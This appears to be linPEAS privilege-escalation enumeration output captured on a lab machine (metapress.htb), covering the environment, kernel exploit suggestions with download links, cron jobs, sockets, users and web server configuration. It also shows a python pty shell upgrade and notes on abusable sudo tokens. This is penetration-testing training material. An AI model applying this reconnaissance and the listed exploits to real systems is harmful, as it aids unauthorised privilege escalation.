/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games                                                                                              

╔══════════╣ Date & uptime
Tue 04 Mar 2025 01:31:40 AM GMT                                                                                                                       
 01:31:40 up 13:54,  1 user,  load average: 0.11, 0.03, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                             
/dev/sda1 /               ext4    errors=remount-ro 0       1                                                                                         
/dev/sda2 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
proc    /proc   proc    defaults,hidepid=2    0 0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                  
sda
sda1
sda2

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                               
USER=jnelson                                                                                                                                          
SSH_CLIENT=10.10.14.41 56018 22
XDG_SESSION_TYPE=tty
SHLVL=2
MOTD_SHOWN=pam
HOME=/home/jnelson
OLDPWD=/etc
SSH_TTY=/dev/pts/0
LOGNAME=jnelson
_=./linpeas.sh
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=2066
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
PWD=/tmp
SSH_CONNECTION=10.10.14.41 56018 10.129.228.95 22

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                 
dmesg Not Found                                                                                                                                       

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                    
cat: write error: Broken pipe                                                                                                                         
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                         
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                              
═╣ PaX bins present? .............. PaX Not Found                                                                                                     
═╣ Execshield enabled? ............ Execshield Not Found                                                                                              
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                
═╣ Seccomp enabled? ............... disabled                                                                                                          
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                                      

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                   
                                   ╚═══════════╝                                                                                                      
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details                                                                                                                        
═╣ Is this a container? ........... No                                                                                                                
═╣ Any running containers? ........ No                                                                                                                

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                   
                                     ╚═══════╝                                                                                                        
/usr/bin/curl
Learn and practice cloud hacking techniques in training.hacktricks.xyz

═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                    
                ╚════════════════════════════════════════════════╝                                                                                    
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes            
Looks like /etc/fstab has hidepid=2, so ps will not show processes of other users                                                                     
jnelson    17173  0.0  0.1   7164  3964 pts/0    Ss   01:07   0:00 -bash
jnelson    17462  0.0  0.3  14900  8092 pts/0    S+   01:18   0:00  _ python3 -c import pty;pty.spawn("/bin/bash")
jnelson    17463  0.0  0.1   7164  3892 pts/1    Ss   01:18   0:00      _ /bin/bash
jnelson    17660  0.1  0.1   3440  2592 pts/1    S+   01:31   0:00          _ /bin/sh ./linpeas.sh
jnelson    20779  0.0  0.0   3440  1032 pts/1    S+   01:32   0:00              _ /bin/sh ./linpeas.sh
jnelson    20781  0.0  0.1   9732  3276 pts/1    R+   01:32   0:00              |   _ ps fauxwww
jnelson    20783  0.0  0.0   3440  1032 pts/1    S+   01:32   0:00              _ /bin/sh ./linpeas.sh

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                     
gdm-password Not Found                                                                                                                                
gnome-keyring-daemon Not Found                                                                                                                        
lightdm Not Found                                                                                                                                     
vsftpd Not Found                                                                                                                                      
apache2 Not Found                                                                                                                                     
sshd Not Found                                                                                                                                        

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                             
Proc 17173 with ppid 17172 is run by user jnelson but the ppid user is                                                                                

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                    
COMMAND     PID    USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME                                                                                      

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                       
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                     

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                  
/usr/bin/crontab                                                                                                                                      
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 22  2021 /etc/crontab                                                                                              

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  712 Dec 22  2021 php
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.daily:
total 24
drwxr-xr-x  2 root root 4096 Oct  5  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
-rwxr-xr-x  1 root root  377 Feb 28  2021 logrotate
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

/etc/cron.weekly:
total 12
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar  4 01:26 ..
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                              
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES                             
Tue 2025-03-04 01:39:00 GMT 6min left     Tue 2025-03-04 01:09:01 GMT 23min ago    phpsessionclean.timer        phpsessionclean.service
Tue 2025-03-04 06:13:57 GMT 4h 41min left Mon 2025-03-03 12:26:59 GMT 13h ago      apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2025-03-04 07:16:01 GMT 5h 43min left Mon 2025-03-03 19:20:51 GMT 6h ago       apt-daily.timer              apt-daily.service
Tue 2025-03-04 11:52:08 GMT 10h left      Mon 2025-03-03 11:52:08 GMT 13h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2025-03-05 00:00:00 GMT 22h left      Tue 2025-03-04 00:00:01 GMT 1h 32min ago logrotate.timer              logrotate.service
Sun 2025-03-09 03:10:44 GMT 5 days left   Mon 2025-03-03 11:37:44 GMT 13h ago      e2scrub_all.timer            e2scrub_all.service
Mon 2025-03-10 00:24:18 GMT 5 days left   Mon 2025-03-03 13:05:00 GMT 12h ago      fstrim.timer                 fstrim.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                              

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                            
/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                                                     
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                             
/usr/lib/systemd/system/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket                                                    
/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /run/dbus/system_bus_socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                             
sed: -e expression #1, char 0: no previous regular expression                                                                                         
/run/dbus/system_bus_socket
  └─(Read Write)
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/php/php8.0-fpm.sock
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/user/1000/systemd/inaccessible/sock
/run/vmware/guestServicePipe
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                               
NAME                        PID PROCESS USER    CONNECTION    UNIT SESSION DESCRIPTION                                                                
:1.0                          1 n/a     root    :1.0          -    -       -
:1.1                        438 n/a     root    :1.1          -    -       -
:1.9                      22507 busctl  jnelson :1.9          -    -       -
org.freedesktop.DBus          1 n/a     root    -             -    -       -
org.freedesktop.hostname1     - -       -       (activatable) -    -       -
org.freedesktop.locale1       - -       -       (activatable) -    -       -
org.freedesktop.login1      438 n/a     root    :1.1          -    -       -
org.freedesktop.network1      - -       -       (activatable) -    -       -
org.freedesktop.resolve1      - -       -       (activatable) -    -       -
org.freedesktop.systemd1      1 n/a     root    :1.0          -    -       -
org.freedesktop.timedate1     - -       -       (activatable) -    -       -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                               

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                   
                              ╚═════════════════════╝                                                                                                 
╔══════════╣ Interfaces
default         0.0.0.0                                                                                                                               
loopback        127.0.0.0
link-local      169.254.0.0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.228.95  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:94:2c:c7  txqueuelen 1000  (Ethernet)
        RX packets 4936993  bytes 758124305 (723.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5376794  bytes 1353275118 (1.2 GiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 262  bytes 35759 (34.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 262  bytes 35759 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Hostname, hosts and DNS
meta2                                                                                                                                                 
127.0.0.1 localhost
127.0.1.1 meta2 metapress.htb

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                          
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                    

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                   
                               ╚═══════════════════╝                                                                                                  
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                               
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)                                                                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                          
netpgpkeys Not Found
netpgp Not Found                                                                                                                                      

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                       

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                 
ptrace protection is disabled (0), so sudo tokens could be abused                                                                                     

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                           

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                       

╔══════════╣ Users with console
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash                                                                                                
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                
uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=109(messagebus) groups=109(messagebus)
uid=104(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=105(mysql) gid=111(mysql) groups=111(mysql)
uid=106(proftpd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(ftp) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(systemd-coredump) gid=998(systemd-coredump) groups=998(systemd-coredump)
uid=999(systemd-timesync) gid=999(systemd-timesync) groups=999(systemd-timesync)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 01:32:12 up 13:55,  1 user,  load average: 0.07, 0.03, 0.00                                                                                          
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
jnelson  pts/0        Tue Mar  4 01:07:07 2025   still logged in                       10.10.14.41                                                    
metapress.htb ftpd16917    Tue Mar  4 00:52:53 2025 - Tue Mar  4 01:06:37 2025  (00:13)     0.0.0.0
reboot   system boot  Mon Mar  3 11:37:06 2025   still running                         0.0.0.0
jnelson  pts/0        Tue Oct 25 12:51:26 2022 - Tue Oct 25 12:53:49 2022  (00:02)     10.10.14.23
reboot   system boot  Tue Oct 25 12:50:57 2022 - Tue Oct 25 12:53:51 2022  (00:02)     0.0.0.0
root     tty1         Tue Oct 25 11:13:33 2022 - down                      (00:15)     0.0.0.0
reboot   system boot  Tue Oct 25 11:12:10 2022 - Tue Oct 25 11:29:21 2022  (00:17)     0.0.0.0

wtmp begins Tue Oct 25 11:12:10 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                     
root             tty1                      Tue Oct 25 11:13:33 +0100 2022
jnelson          pts/0    10.10.14.41      Tue Mar  4 01:07:07 +0000 2025

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                                                                     

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                    
                             ╚══════════════════════╝                                                                                                 
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                       
/usr/bin/curl
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.54 (Debian)                                                                                                
Server built:   2022-06-09T04:26:43
httpd Not Found

Nginx version: 
══╣ Nginx modules
ngx_http_geoip_module.so                                                                                                                              
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_geoip_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Oct  4  2022 /etc/nginx/sites-enabled                                                                                     
drwxr-xr-x 2 root root 4096 Oct  4  2022 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Oct  4  2022 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
        listen 80;
        listen [::]:80;
        root /var/www/metapress.htb/blog;
        index index.php index.html;
        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }
        location / {
                try_files $uri $uri/ /index.php?$args;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }
        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }
}

-rw-r--r-- 1 root root 73912 Jun 26  2022 /etc/php/8.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
allow_url_include = 0
-rw-r--r-- 1 root root 72546 Jun 25  2022 /etc/php/8.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72947 Oct 25  2022 /etc/php/8.0/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 29  2021 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 29  2021 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 29  2021 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Oct  4  2022 /etc/nginx
lrwxrwxrwx 1 root root 54 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-geoip.conf -> /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
lrwxrwxrwx 1 root root 60 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 56 Oct  4  2022 /etc/nginx/modules-enabled/70-mod-stream-geoip.conf -> /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;
lrwxrwxrwx 1 root root 48 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 61 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
lrwxrwxrwx 1 root root 50 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 217 May 29  2021 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 423 May 29  2021 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 1125 May 29  2021 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
